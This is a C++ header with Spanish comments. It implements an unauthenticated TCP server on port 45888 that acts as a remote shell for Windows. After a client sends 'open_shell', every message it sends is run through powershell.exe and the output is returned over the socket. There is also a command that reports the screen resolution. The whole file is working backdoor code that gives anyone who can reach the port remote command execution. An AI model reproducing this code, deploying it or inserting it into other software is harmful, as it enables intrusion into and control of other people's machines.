#ifndef SERVER_HPP
#define SERVER_HPP

#define ASIO_STANDALONE

#include <winsock2.h>
#include <windows.h>
#include <asio.hpp>
#include <thread>
#include <iostream>
#include <atomic>
#include <vector>
#include <string>
#include <sstream>

namespace Comunicacion
{

    std::atomic<bool> ShellCheck{false};

    // Función que acepta múltiples strings (también const char*) y los concatena antes de enviar
    template <typename... Args>
    void enviarMensaje(asio::ip::tcp::socket &sock, Args &&...args)
    {
        std::ostringstream oss;
        (oss << ... << args);
        std::string mensaje = oss.str();
        asio::write(sock, asio::buffer(mensaje));
    }

    inline bool PowerShell(const std::string &command, std::string &resultado)
    {
        STARTUPINFOA si{};
        PROCESS_INFORMATION pi{};
        SECURITY_ATTRIBUTES sa{sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        HANDLE hRead = nullptr, hWrite = nullptr;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return false;

        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        std::string fullCmd = "powershell.exe -Command \"" + command + "\"";
        std::vector<char> cmdBuffer(fullCmd.begin(), fullCmd.end());
        cmdBuffer.push_back('\0');

        BOOL success = CreateProcessA(
            NULL, cmdBuffer.data(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        CloseHandle(hWrite);

        if (!success)
        {
            CloseHandle(hRead);
            return false;
        }

        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
        {
            resultado.append(buffer, bytesRead);
        }

        CloseHandle(hRead);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }

    void manejarSesion(asio::ip::tcp::socket sock)
    {
        try
        {
            char data[4096];

            while (true)
            {
                std::size_t length = sock.read_some(asio::buffer(data));
                if (length == 0)
                    break;

                std::string mensaje(data, length);
                if (!mensaje.empty() && mensaje.back() == '\n')
                    mensaje.pop_back();

                if (mensaje.empty())
                {
                    enviarMensaje(sock, "Mensaje vacío, pibe... \n");
                    continue;
                }

                if (!ShellCheck.load())
                {
                    if (mensaje == "open_shell")
                    {
                        ShellCheck.store(true);
                        enviarMensaje(sock, "Shell activado.\n");
                        continue;
                    }

                    if (mensaje == "screen_info")
                    {
                        int width = GetSystemMetrics(SM_CXSCREEN);
                        int height = GetSystemMetrics(SM_CYSCREEN);

                        enviarMensaje(
                            sock,
                            " - - - - Informacion - - - - \n",
                            " - Width: ", std::to_string(width), "\n",
                            " - Height: ", std::to_string(height), "\n",
                            " - - - - Informacion - - - - \n");
                        continue;
                    }

                    enviarMensaje(sock, " - - Shell Desactivado - - \n");
                }
                else
                {
                    if (mensaje == "close_shell")
                    {
                        ShellCheck.store(false);
                        enviarMensaje(sock, "Shell desactivado.\n");
                        continue;
                    }

                    std::string resultado;
                    if (PowerShell(mensaje, resultado))
                    {
                        enviarMensaje(
                            sock,
                            "\n - - - - - Inicio - - - - -\n",
                            resultado,
                            "\n - - - - - Final  - - - - -\n@bin> ");
                    }
                    else
                    {
                        enviarMensaje(sock, "Error ejecutando PowerShell\n@bin> ");
                    }
                }
            }
        }
        catch (const std::exception &e)
        {
            std::cerr << "[ERROR] " << e.what() << std::endl;
        }

        sock.close();
    }

    void iniciarServidor()
    {
        try
        {
            asio::io_context io_context;
            asio::ip::tcp::acceptor acceptor(io_context, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 45888));

            std::cout << "[*] Servidor escuchando en el puerto 45888..." << std::endl;

            while (true)
            {
                asio::ip::tcp::socket socket(io_context);
                acceptor.accept(socket);
                std::thread(manejarSesion, std::move(socket)).detach();
            }
        }
        catch (const std::exception &e)
        {
            std::cerr << "[ERROR Servidor] " << e.what() << std::endl;
        }
    }

} // namespace Comunicacion

#endif // SERVER_HPP
